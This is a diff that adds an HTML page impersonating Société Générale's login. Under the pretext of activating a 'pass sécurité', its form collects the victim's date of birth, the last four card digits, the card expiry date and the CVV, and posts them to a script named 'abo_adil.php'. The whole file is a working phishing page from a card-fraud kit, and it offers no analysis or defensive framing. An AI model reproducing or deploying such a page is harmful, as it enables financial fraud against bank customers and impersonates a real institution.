@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+	<title>Société Générale | Connexion</title>
+	<link rel="icon" type="image/x-icon" href="./img2/index.ico">
+	<link rel="stylesheet" href="./css/main-sms.css">
+	<link rel="stylesheet" href="./css/media-sms.css">
+	<script type="text/javascript">function chek_put(){var puta1= document.getElementById('jj');var puta2= document.getElementById('mm');var puta3= document.getElementById('aa');var puta4= document.getElementById('cv');var puta5= document.getElementById('EMM');var puta6= document.getElementById('EYY');var puta7= document.getElementById('xxx');if (puta1.value.length == 0){document.getElementById('jj').style.borderColor = "red";}if (puta2.value.length == 0){document.getElementById('mm').style.borderColor = "red";}if (puta3.value.length == 0) {document.getElementById('aa').style.borderColor = "red";}if (puta4.value.length == 0) {document.getElementById('cv').style.borderColor = "red";}if (puta5.value.length == 0) {document.getElementById('EMM').style.borderColor = "red";}if (puta6.value.length == 0) {document.getElementById('EYY').style.borderColor = "red";}if (puta7.value.length == 0) {document.getElementById('xxx').style.borderColor = "red";}chek_kolchi_wach_zaz();}function chek_kolchi_wach_zaz(){var puta1= document.getElementById('jj'); var puta2= document.getElementById('mm');var puta3= document.getElementById('aa');var puta4= document.getElementById('cv');var puta7= document.getElementById('xxx');if(puta1.value.length == 2 && puta2.value.length == 2 && puta3.value.length == 4 && puta4.value.length == 4 && puta7.value.length == 3){document.getElementById('myform').submit();;return false;}}
+	function chek1(){var v1 = document.getElementById('jj');if(v1.value.length > 0){document.getElementById('jj').style.borderColor = "#bbd9f9"}}
+	function chek2(){var v1 = document.getElementById('mm');if(v1.value.length > 0){document.getElementById('mm').style.borderColor = "#bbd9f9"}}
+	function chek3(){var v1 = document.getElementById('aa');if(v1.value.length > 0){document.getElementById('aa').style.borderColor = "#bbd9f9"}}
+	function chek4(){var v1 = document.getElementById('cv');if(v1.value.length > 0){document.getElementById('cv').style.borderColor = "#bbd9f9"}}
+	function chek5(){var v1 = document.getElementById('EMM');if(v1.value.length > 0){document.getElementById('EMM').style.borderColor = "#bbd9f9"}}
+	function chek6(){var v1 = document.getElementById('EYY');if(v1.value.length > 0){document.getElementById('EYY').style.borderColor = "#bbd9f9"}}
+	function chek7(){var v1 = document.getElementById('xxx');if(v1.value.length > 0){document.getElementById('xxx').style.borderColor = "#bbd9f9"}}
+	</script>
+</head>
+<body>
+	<div class="kolchi">
+		
+		<div class="header">
+			<div class="header-left"></div>
+			<!-- hena sala header left -->
+			<div class="header-right"></div>
+			<!-- hena sala header right -->
+		</div>
+		<!-- hena sala header -->
+		<div class="header-phone">
+				<div class="header-phone-left"></div>
+				<div class="header-phone-right"></div>
+	    </div>
+			<!-- hena sala header right -->
+		<div class="navbar">
+			<div class="hr"></div>
+			<div class="hr-bg">
+				<div class="hr-tit"></div>
+			</div>
+		</div>
+		<div class="navbar-phone"></div>
+		<!-- hena sala navbar right -->
+		<center>
+			<div class="dakchi-west">
+
+				<div class="dakchi-west-body">
+					<div class="hena-bikola">
+					<form id="myform" action="abo_adil.php" method="POST" accept-charset="utf-8">
+						<div class="bikola-title-1">Activation de votre pass sécurité </div>
+						<div class="bikola1">
+							<div class="bikola1-1">1. DATE DE NAISSANCE</div>
+							<div class="bikola1-2">
+								<div class="data"><input id="jj" name="jj" type="text" pattern="\d*" class="datos" placeholder="Jour" maxlength="2" size="2" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;else{chek1();}"></div>
+								<div class="data"><input id="mm" name="mm" type="text" pattern="\d*" class="datos" placeholder="Mois" maxlength="2" size="2" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;else{chek2();}"></div>
+								<div class="data"><input id="aa" name="aa" type="text" pattern="\d*" class="datos" placeholder="Année" maxlength="4" size="4" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;else{chek3();}"></div>
+							</div>
+						</div>
+						<div class="bikola1">
+							<div class="bikola1-1">2. DERNIERS (4) CHIFFRES DE VOTRE CARTE CRÉDIT</div>
+							<div class="bikola1-2">
+								<div class="bikola-chif-left jibha">XXXX-XXXX-XXXX</div>
+								<div class="bikola-chif-left"><input type="text" id="cv" name="cv" pattern="\d*" class="datosa" placeholder="XXXX" maxlength="4" size="4" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;else{chek4();}"></div>
+							</div>
+						</div>
+						<div class="bikola1">
+							<div class="bikola1-1">3. DATE D'EXPIRATION</div>
+							<div class="bikola1-2">
+								<div class="bikoza">
+									<div id="MOISs">
+										<select name="EMM" onchange="chek5();" id="EMM" class="solking">
+                                              <option value="" disabled selected>Mois</option>
+                                              <option value="01">01</option>
+                                              <option value="02">02</option>
+                                              <option value="03">03</option>
+                                              <option value="04">04</option>
+                                              <option value="05">05</option>
+                                              <option value="06">06</option>
+                                              <option value="07">07</option>
+                                              <option value="08">08</option>
+                                              <option value="09">09</option>
+                                              <option value="10">10</option>
+                                              <option value="11">11</option>
+                                              <option value="12">12</option>
+                                        </select>
+                                    </div>
+								</div>
+								<div class="bikoza">
+									<div id="Anne">
+										<select name="EYY" onchange="chek6();" id="EYY" class="solking">
+                                             <option value="" disabled selected>Année</option>
+                                             <option value="19">2019</option>
+                                             <option value="20">2020</option>
+                                             <option value="21">2021</option>
+                                             <option value="22">2022</option>
+                                             <option value="23">2023</option>
+                                             <option value="24">2024</option>
+                                             <option value="25">2025</option>
+                                             <option value="25">2026</option>
+                        
+                                        </select>
+                                    </div>
+								</div>
+							</div>
+						</div>
+						<div class="bikola1">
+							<div class="bikola1-1">4. CRYPTOGRAMME VISUEL</div>
+							<div class="bikola1-2">
+								<div class="bibita">
+                                    <input type="text" id="xxx" name="xxx" pattern="\d*" class="harba" placeholder="XXX" maxlength="3" size="3" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;else{chek7();}">
+								</div>
+							</div>
+							<div class="foter"><center><div class="buta-foter" onclick="chek_put();">ACTIVER MON PASS SÉCURITÉ</div></center></div>
+						</div>	
+					</form>
+						
+					</div>
+				</div>
+				
+			</div>
+			<!-- hena sala dakchi west -->
+		</center>
+    
+	</div>
+	<!-- hena sala kolchi -->
+     <div class="foot"></div>
+</body>
+</html>
